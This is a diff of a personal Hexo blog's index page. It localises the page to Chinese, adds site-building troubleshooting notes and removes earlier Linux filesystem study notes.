@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -17,16 +17,16 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="区块链">
+  <meta name="description" content="Karry的成长历程">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Karry blog">
 <meta property="og:url" content="https://example.com/index.html">
 <meta property="og:site_name" content="Karry blog">
-<meta property="og:description" content="区块链">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="Karry的成长历程">
+<meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="Karry-Almond">
 <meta name="twitter:card" content="summary">
 
@@ -39,7 +39,7 @@
     sidebar: "",
     isHome : true,
     isPost : false,
-    lang   : 'en'
+    lang   : 'zh-CN'
   };
 </script>
 
@@ -83,7 +83,7 @@
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
+    <div class="toggle" aria-label="切换导航栏">
       <span class="toggle-line toggle-line-first"></span>
       <span class="toggle-line toggle-line-middle"></span>
       <span class="toggle-line toggle-line-last"></span>
@@ -110,14 +110,24 @@
 
 <nav class="site-nav">
   <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
+        <li class="menu-item menu-item-首页">
 
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
-        <li class="menu-item menu-item-archives">
+        <li class="menu-item menu-item-简历">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>简历</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
   </ul>
@@ -146,13 +156,13 @@
       
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://example.com/2022/03/17/SUMMARY/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://example.com/2022/02/22/github+hexo+next%E5%BB%BA%E7%AB%99/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Karry-Almond">
-      <meta itemprop="description" content="区块链">
+      <meta itemprop="description" content="Karry的成长历程">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -161,7 +171,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/03/17/SUMMARY/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/2022/02/22/github+hexo+next%E5%BB%BA%E7%AB%99/" class="post-title-link" itemprop="url">github+hexo+next建站</a>
         </h2>
 
         <div class="post-meta">
@@ -169,145 +179,25 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-calendar"></i>
               </span>
-              <span class="post-meta-item-text">Posted on</span>
+              <span class="post-meta-item-text">发表于</span>
 
-              <time title="Created: 2022-03-17 21:25:43" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
+              <time title="创建时间：2022-02-22 22:22:22" itemprop="dateCreated datePublished" datetime="2022-02-22T22:22:22+08:00">2022-02-22</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-02-21 17:39:38" itemprop="dateModified" datetime="2022-02-21T17:39:38+08:00">2022-02-21</time>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-22 15:32:54" itemprop="dateModified" datetime="2022-03-22T15:32:54+08:00">2022-03-22</time>
               </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Table-of-contents"><a href="#Table-of-contents" class="headerlink" title="Table of contents"></a>Table of contents</h1><ul>
-<li><a href="README.md">Karry learning</a></li>
-<li><a href="README%20(1).md">区块链官方CTF题 write-up</a></li>
-<li><a href="blockchain.md">区块链</a></li>
-<li><a href="linux.md">linux</a></li>
-<li><a href="resource.md">资源</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://example.com/2022/03/17/README/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Karry-Almond">
-      <meta itemprop="description" content="区块链">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Karry blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/README/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
+                <i class="far fa-folder"></i>
               </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-17 21:25:43" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%BB%BA%E7%AB%99/" itemprop="url" rel="index"><span itemprop="name">建站</span></a>
                 </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-02-21 17:39:38" itemprop="dateModified" datetime="2022-02-21T17:39:38+08:00">2022-02-21</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Karry-learning"><a href="#Karry-learning" class="headerlink" title="Karry learning"></a>Karry learning</h1><h2 id="It-is-karry’s-learning-blog"><a href="#It-is-karry’s-learning-blog" class="headerlink" title="It is karry’s learning blog."></a>It is karry’s learning blog.</h2><h2 id="Eojoy-learning-with-me"><a href="#Eojoy-learning-with-me" class="headerlink" title="Eojoy learning with me!"></a>Eojoy learning with me!</h2>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://example.com/2022/03/17/github%E5%BB%BA%E7%AB%99/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Karry-Almond">
-      <meta itemprop="description" content="区块链">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Karry blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/github%E5%BB%BA%E7%AB%99/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-03-17 21:25:43 / Modified: 21:04:42" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
             </span>
 
           
@@ -321,9 +211,41 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="使用jekyll自定义博客"><a href="#使用jekyll自定义博客" class="headerlink" title="使用jekyll自定义博客"></a>使用jekyll自定义博客</h1><p>虽然有github官网的说明文档，但是实际操作起来还是有些生硬，故做以下博客。</p>
+          <h1 id="使用jekyll自定义博客"><a href="#使用jekyll自定义博客" class="headerlink" title="使用jekyll自定义博客"></a>使用jekyll自定义博客</h1><p>虽然有github官网的说明文档，但是实际操作起来还是有些生硬，故做以下博客。</p>
 <h1 id="卸载nodejs"><a href="#卸载nodejs" class="headerlink" title="卸载nodejs"></a>卸载nodejs</h1><p>因为本机的nodejs太老了，使用之后发现老是报一些包的错误，故卸载nodejs并重装。没有这个情况的同学可以不管。</p>
 <p>具体查看网址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/strawberry_x/article/details/113648770">https://blog.csdn.net/strawberry_x/article/details/113648770</a></p>
+<blockquote>
+<p>err: YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key</p>
+</blockquote>
+<p>因为type后面要有一个空格，正确的写法是：</p>
+<blockquote>
+<p>type: “categories”</p>
+</blockquote>
+<h3 id="Hexo-next-主题配置右侧栏的分类和标签打开的是空白"><a href="#Hexo-next-主题配置右侧栏的分类和标签打开的是空白" class="headerlink" title="Hexo next 主题配置右侧栏的分类和标签打开的是空白"></a>Hexo next 主题配置右侧栏的分类和标签打开的是空白</h3><p>先前 categorier 文件夹（myblog\source\categories），里面的 index.md 文件打开（没有文件夹就新建文件夹，再新建文件、没有文件就新建文件），修改为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line"><span class="built_in">date</span>: 2018-01-23 17:14:51</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span>   <span class="comment">#新添加的</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>详见：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f138032e7539">https://www.jianshu.com/p/f138032e7539</a></p>
+<p>改了<code>站点配置文件</code>中language，显示的是德语而不是中文</p>
+<p>错误改法：zh-cn</p>
+<p>正确改法：zh-CN</p>
+<p>原因是next&#x2F;language文件夹下有着语言包，包名就是zh-CN.yml，如果小写的话，找不到对应的文件，默认第一个语言包，就是德语</p>
+<p>缺少内容：</p>
+<ol>
+<li>左侧头像、github链接、</li>
+<li>资源文件夹（包括pdf和图片的放置）</li>
+<li>背景图片</li>
+<li>加载进度</li>
+<li>搜索</li>
+<li>文章字数</li>
+<li>阅读数量</li>
+<li>个人简介</li>
+</ol>
+<p>建站：</p>
+<p><a target="_blank" rel="noopener" href="https://www.simon96.online/2018/10/12/hexo-tutorial/">https://www.simon96.online/2018/10/12/hexo-tutorial/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/as480133937/article/details/100138838">https://blog.csdn.net/as480133937/article/details/100138838</a></p>
+<p><a target="_blank" rel="noopener" href="https://theme-next.iissnan.com/tag-plugins.html">https://theme-next.iissnan.com/tag-plugins.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/data-files">https://hexo.io/zh-cn/docs/data-files</a></p>
+<p><a target="_blank" rel="noopener" href="https://charlie_lee.gitee.io/blog/posts/680198be.html">https://charlie_lee.gitee.io/blog/posts/680198be.html</a></p>
 
       
     </div>
@@ -342,13 +264,13 @@
       
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://example.com/2022/03/17/linux/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://example.com/2022/02/22/web%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Karry-Almond">
-      <meta itemprop="description" content="区块链">
+      <meta itemprop="description" content="Karry的成长历程">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -357,7 +279,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/03/17/linux/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/2022/02/22/web%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">Web学习</a>
         </h2>
 
         <div class="post-meta">
@@ -365,17 +287,30 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-calendar"></i>
               </span>
-              <span class="post-meta-item-text">Posted on</span>
+              <span class="post-meta-item-text">发表于</span>
 
-              <time title="Created: 2022-03-17 21:25:43" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
+              <time title="创建时间：2022-02-22 22:22:22" itemprop="dateCreated datePublished" datetime="2022-02-22T22:22:22+08:00">2022-02-22</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-02-12 16:40:57" itemprop="dateModified" datetime="2022-02-12T16:40:57+08:00">2022-02-12</time>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-22 13:22:05" itemprop="dateModified" datetime="2022-03-22T13:22:05+08:00">2022-03-22</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+            </span>
 
           
 
@@ -388,136 +323,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="MBR和GPT"><a href="#MBR和GPT" class="headerlink" title="MBR和GPT"></a>MBR和GPT</h2><p><em>GPT和MBR是不同的分区表类型</em>；使用MBR分区表的硬盘最多只能划分4个主分区磁盘，如果分区的硬盘容量超过2TB了，则需要使用GPT分区表类型，是一种新的硬盘分区标准；MBR的意思是主引导记录，它有自己的启动器，也就是启动代码，GPT是一个正逐渐取代MBR的新标准，它由UEFI辅住而形成的</p>
-<h2 id="sda和vda"><a href="#sda和vda" class="headerlink" title="sda和vda"></a>sda和vda</h2><p>主机中实际硬盘位stat接口的，表示为sd[a-d]（在MBR模式下）。</p>
-<p>假设你的主机为虚拟机，里面仅有一颗VirtIO接口的磁盘，他在Linux操作系统里面的设备文件名为vda</p>
-<h2 id="挂载点"><a href="#挂载点" class="headerlink" title="挂载点"></a>挂载点</h2><p>比如说根目录&#x2F;，可以说选择挂载点&#x2F;，容量为20GB。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于 XFS filesystem 最顶层的目录之 inode 一般为 128 号，因此可以发现 /,/boot, /home 为三个不同的 filesystem 啰！ （因为每一行的文件属性并不相同，且三个目录的挂载点也均不相同之故。）p358</span><br></pre></td></tr></table></figure>
-
-<p>为什么这样说？？？而且我自己试验时，&#x2F;home的.和..的inode确实一样，但是使用cd ..仍然会到&#x2F;目录去。</p>
-<p>df 之后出现的filesystem，比如<code>/dev/mapper/centos-root </code>，或者<code>tmpfs</code>表示什么意思？具体设备？具体分区？还是一种文件类型（但是又不会存在xfs）？</p>
-<h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>将一个设备和一个挂载点联系起来。比如将&#x2F;dev&#x2F;sda挂载到&#x2F;。</p>
-<p>把目录想象成快捷方式，分区是实际存储数据的地方，如果将&#x2F;dev&#x2F;sda挂载到&#x2F;test1和&#x2F;test2，那么打开两个目录，会看见一样的东西，即&#x2F;dev&#x2F;sda分区里的内容，数据也只有原来分区里的一份。</p>
-<h2 id="分区配置"><a href="#分区配置" class="headerlink" title="分区配置"></a>分区配置</h2><p>所有刚刚装系统配置的东西，包括 root 的密码等等，通通都会被纪录到 &#x2F;root&#x2F;anaconda-ks.cfg 这个文件内喔。</p>
-<p>google找 kickstart 这个关键字，会得到很多协助喔</p>
-<h2 id="文件与目录权限"><a href="#文件与目录权限" class="headerlink" title="文件与目录权限"></a>文件与目录权限</h2><ul>
-<li>目录的权限：</li>
-</ul>
-<blockquote>
-<p> r 是可以读取目录中的文件列表，就像抽屉里有灯一样。</p>
-<p>w 是可以编辑目录，可以删除目录中的文件。就像这个抽屉是我的，就算我抽屉里的东西不是我的，也可以扔掉。</p>
-<p>x 是可以进入目录进行工作。必须要有目录的x权限，才可以对目录中的文件进行读取、修改、执行等操作。注意就算没有r权限，只有x权限，只要知道文件名字也是可以进行操作的。</p>
-</blockquote>
-<ul>
-<li>文件权限：</li>
-</ul>
-<blockquote>
-<p>chown、chgrp、chmod</p>
-</blockquote>
-<h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><p>ls -d test* 才可以显示本目录下test开头的目录，那我怎么知道要加 test* 这个参数？man手册也没写要加参数。</p>
-<p>ls -l 长信息、ls -a 所有信息、ls -d 只列出目录</p>
-<h2 id="pwd、rmdir、mkdir"><a href="#pwd、rmdir、mkdir" class="headerlink" title="pwd、rmdir、mkdir"></a>pwd、rmdir、mkdir</h2><p>pwd：显示所在工作路径。</p>
-<blockquote>
-<p> pwd -P 可以查询真实路径，即如果本路径是链接文件，可以找到链接的真实地址</p>
-</blockquote>
-<p>mkdir：创建空目录。</p>
-<blockquote>
-<p>mkdir -m可以设置权限：mkdir -m 777 test </p>
-</blockquote>
-<blockquote>
-<p> mkdir -p 可以创建在没有目录的地方创建新目录：mkdir -p test1&#x2F;test2&#x2F;test3</p>
-</blockquote>
-<p>rmdir：删除空目录。</p>
-<blockquote>
-<p>接着刚刚创建的目录，继续输入rmdir -p test1&#x2F;test2&#x2F;test3 可以直接删掉test1</p>
-</blockquote>
-<h2 id="cp、rm、mv"><a href="#cp、rm、mv" class="headerlink" title="cp、rm、mv"></a>cp、rm、mv</h2><p>cp</p>
-<h2 id="分区、文件系统、挂载点"><a href="#分区、文件系统、挂载点" class="headerlink" title="分区、文件系统、挂载点"></a>分区、文件系统、挂载点</h2><p>分区是针对磁盘进行的。在完成了分区后的分区（在linux中类似于&#x2F;dev&#x2F;sda，&#x2F;dev&#x2F;sdb1，&#x2F;dev&#x2F;sdb2等的设备就是完成了分区后的分区）进行文件系统初始化（也就是常说的格式化），再把文件系统挂载到制定目录。</p>
-<ol>
-<li>查看指定 <strong>“文件系统”</strong> 的整体信息（主要是对superblock进行查询）：</li>
-</ol>
-<ul>
-<li>blkid</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/dev/sda2: UUID=&quot;65fd77a4-9ba1-4f38-9f3a-2950c03be2ee&quot; TYPE=&quot;xfs&quot; PARTUUID=&quot;4c604443-e940-4908-98eb-12db2e7e90b6&quot; </span><br><span class="line"></span><br><span class="line">/dev/sda3: UUID=&quot;SNfPIA-f2WC-FzWc-bwNx-cCPe-dzkI-ATrhnF&quot; TYPE=&quot;LVM2_member&quot; PARTUUID=&quot;b768fcbe-aa0f-4546-aa74-7a60cde38323&quot; </span><br><span class="line"></span><br><span class="line">/dev/mapper/centos-root: UUID=&quot;1961737b-c19b-422a-a0aa-9e2d3b5d3a28&quot; TYPE=&quot;xfs&quot; </span><br><span class="line"></span><br><span class="line">/dev/mapper/centos-swap: UUID=&quot;5c6a4fdf-a774-4a2f-8e3c-83a56a2569e5&quot; TYPE=&quot;swap&quot; </span><br><span class="line"></span><br><span class="line">/dev/mapper/centos-home: UUID=&quot;1e1228ba-eeaf-4e63-87aa-a74c3e305e05&quot; TYPE=&quot;xfs&quot;</span><br></pre></td></tr></table></figure>
-
-<p>这里的 &#x2F;dev&#x2F;sda2，&#x2F;dev&#x2F;mapper&#x2F;centos-home 都是分区（即设备名）</p>
-<ul>
-<li>dumpe2fs 分区名</li>
-</ul>
-<p>查询 Ext 家族 superblock 信息的指令，注意，只能查询使用ext文件系统的格式化的分区。</p>
-<ul>
-<li>xfs_info 分区名 或 挂载点</li>
-</ul>
-<p>查询该分区或该挂载点下文件系统的信息，只能查询使用xfs文件系统的格式化的分区信息</p>
-<ol start="2">
-<li>查询“磁盘”与目录容量</li>
-</ol>
-<ul>
-<li><strong>df</strong>  （即disk free。作用是 列出已经挂载好的文件系统的磁盘使用情况）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]# df [-ahikHTm] [目录或文件名]</span><br><span class="line">选项与参数：</span><br><span class="line">-a ：列出所有的文件系统，包括系统特有的 /proc 等文件系统；</span><br><span class="line">-k ：以 KBytes 的容量显示各文件系统；</span><br><span class="line">-m ：以 MBytes 的容量显示各文件系统；</span><br><span class="line">-h ：以人们较易阅读的 GBytes, MBytes, KBytes 等格式自行显示；</span><br><span class="line">-H ：以 M=1000K 取代 M=1024K 的进位方式；</span><br><span class="line">-T ：连同该 partition 的 filesystem 名称 （例如 xfs） 也列出；</span><br><span class="line">-i ：不用磁盘容量，而以 inode 的数量来显示</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[jrk@localhost test]$ df</span><br><span class="line">文件系统                   1K-块    已用    可用 已用% 挂载点</span><br><span class="line">devtmpfs                 1913564       0 1913564    0% /dev</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>du</strong> （即disk usage，作用是查询指定文件夹的大小）</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~]# du [-ahskm] 文件或目录名称</span><br><span class="line">选项与参数：</span><br><span class="line">-a ：列出所有的文件与目录容量，因为默认仅统计目录下面的文件量而已。</span><br><span class="line">-h ：以人们较易读的容量格式 （G/M） 显示；</span><br><span class="line">-s ：列出总量而已，而不列出每个各别的目录占用容量；</span><br><span class="line">-S ：不包括子目录下的总计，与 -s 有点差别。</span><br><span class="line">-k ：以 KBytes 列出容量显示；</span><br><span class="line">-m ：以 MBytes 列出容量显示；</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[jrk@localhost test]$ du -a</span><br><span class="line">44	./test12</span><br><span class="line">44	.</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>链接</li>
-</ol>
-<ul>
-<li>符号链接（symbolic link）：</li>
-</ul>
-<p>例如：<code>ln -s /etc/crontab crontab2</code> </p>
-<p>意思是<code>对/etc/crontab 创建快捷方式，名称叫crontab2</code></p>
-<ul>
-<li>硬链接（hard link）：</li>
-</ul>
-<p>例如：<code>ln /etc/crontab .</code></p>
-<p>意思是<code>在本文件夹下创建一个和原文件同名的硬链接</code></p>
-<table>
-<thead>
-<tr>
-<th align="center">符号链接</th>
-<th align="right"></th>
-<th align="center">硬链接</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">类似于windows的创建快捷方式，会实际产生一个文件，文件的block中存的是链接的地址。</td>
-<td align="right"></td>
-<td align="center">直接将该文件的inode指向目标文件的inode。</td>
-</tr>
-<tr>
-<td align="center">会占用磁盘，是一个独立文件</td>
-<td align="right"></td>
-<td align="center">不占用磁盘block，不是一个独立文件</td>
-</tr>
-<tr>
-<td align="center">可以链接文件夹</td>
-<td align="right"></td>
-<td align="center">不可以链接文件夹</td>
-</tr>
-<tr>
-<td align="center">删除快捷方式就是单纯删除了快捷方式文件</td>
-<td align="right"></td>
-<td align="center">删除该文件会使原文件inode的数量减一，原文件只有inode为0时才被删除</td>
-</tr>
-<tr>
-<td align="center"></td>
-<td align="right"></td>
-<td align="center"></td>
-</tr>
-</tbody></table>
-<p>分区相关命令：</p>
-
+          <p>慢慢积累传统web方向的基础知识和常用工具等。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/22/web%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -535,13 +349,13 @@
       
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://example.com/2022/03/17/reserve/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://example.com/2022/02/22/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Karry-Almond">
-      <meta itemprop="description" content="区块链">
+      <meta itemprop="description" content="Karry的成长历程">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -550,7 +364,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/03/17/reserve/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/2022/02/22/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">区块链原理</a>
         </h2>
 
         <div class="post-meta">
@@ -558,17 +372,26 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-calendar"></i>
               </span>
-              <span class="post-meta-item-text">Posted on</span>
+              <span class="post-meta-item-text">发表于</span>
 
-              <time title="Created: 2022-03-17 21:25:43" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
+              <time title="创建时间：2022-02-22 22:22:22" itemprop="dateCreated datePublished" datetime="2022-02-22T22:22:22+08:00">2022-02-22</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-10 22:29:31" itemprop="dateModified" datetime="2022-03-10T22:29:31+08:00">2022-03-10</time>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-22 13:14:40" itemprop="dateModified" datetime="2022-03-22T13:14:40+08:00">2022-03-22</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
